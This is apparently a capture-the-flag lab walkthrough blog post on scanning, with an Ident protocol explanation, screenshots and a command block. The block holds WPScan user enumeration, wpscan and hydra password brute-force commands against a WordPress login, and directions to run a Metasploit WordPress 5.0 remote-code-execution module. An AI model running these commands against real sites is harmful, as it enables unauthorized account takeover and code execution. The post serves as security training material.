---
date: 2025-04-24
categories: [CTF, IML]
title: "IML - Scanning: Demonstrate Your Skills"
tags: ['hydra', 'privilege escalation', 'rce']

description: "Scanning Demonstrate Your Skills - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# IML - Scanning: Demonstrate Your Skills

The Ident Protocol is used over the Internet to associate a TCP connection with a specific user. Originally designed to aid in network management and security, it operates by allowing a server to query a client on port 113 to request information about the user of a particular TCP connection

![image1](../resources/2de1db59dbc6472f8af9f6f3cde5f59c.png)


![image2](../resources/eb191f5debd54a5db7cf0286d08a120e.png)

Target 2


![image3](../resources/5d4c5931a68b4f7d8a91d7ccf3d5696a.png)


![image4](../resources/672f8c3f4808473f972ee83b83c13bc4.png)


![image5](../resources/a5832b28ee664540b32437a943460d33.png)


![image6](../resources/f5c320e8aa7c49d79c045e944fb7e237.png)

![image7](../resources/c05da0e0c82749d5b1698bdef6ef7eba.png)


![image8](../resources/1d48218e63674b3b84ec2f403d558d7a.png)


![image9](../resources/69c33c6a221d4c348cb41d600e7faa0e.png)


![image10](../resources/e90800abb2994c9e9af2e5235781c3a4.png)


```bash
#Run a Basic WPScan
wpscan --url http://yourwebsite.com

#Scan for Themes and Plugins
wpscan --url http://yourwebsite.com --enumerate at
wpscan --url http://yourwebsite.com --enumerate ap

#Enumerate WordPress Users
wpscan --url http://yourwebsite.com --enumerate u

#Bruteforce a WordPress Login Password
wpscan --url http://yoursite.com --passwords path-to-wordlist --usernames <list of usernames or just one>

#Bruteforce a WordPress Login Password - Hydra
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt <IP_ADDRESS> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -V
```

**<u>Wordpress 5.0 exploit</u>**

**Need a username and password to use**

msfconsole > multi/http/wp_crop_rce
Now just set the options (USERNAME, PASSWORD, RHOSTS, LHOST) and exploit

